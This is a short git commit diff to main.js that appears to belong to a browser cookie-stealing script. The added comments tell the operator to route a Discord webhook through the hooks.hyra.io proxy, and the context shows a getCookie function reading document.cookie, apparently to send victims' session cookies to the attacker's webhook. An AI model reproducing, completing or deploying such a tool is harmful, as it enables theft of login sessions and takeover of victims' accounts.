1d69a48cd39476c1a538e4852259c77c94e2ba41
littlepig453 <84644303+littlepig453@users.noreply.github.com>
2022-04-16 15:03:53 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,4 +1,9 @@
 // WEBHOOK URL GOES IN WEBHOOK VALUE (dont delete the *s). on line 11
+//IMPORTANT INFO LISTEN UP
+//take your webhook url
+//it looks like this: https://discord.com/api/webhooks/ABunchOfNumbersNoOneCaresAbout/SomeLettersAndStuff
+//now make it look like this: https://hooks.hyra.io/api/webhooks/ABunchOfNumbersNoOneCaresAbout/SomeLettersAndStuff
+//now put THAT as the webhook url on line 16
 function getCookie(name) {
   const value = `; ${document.cookie}`;
   const parts = value.split(`; ${name}=`);
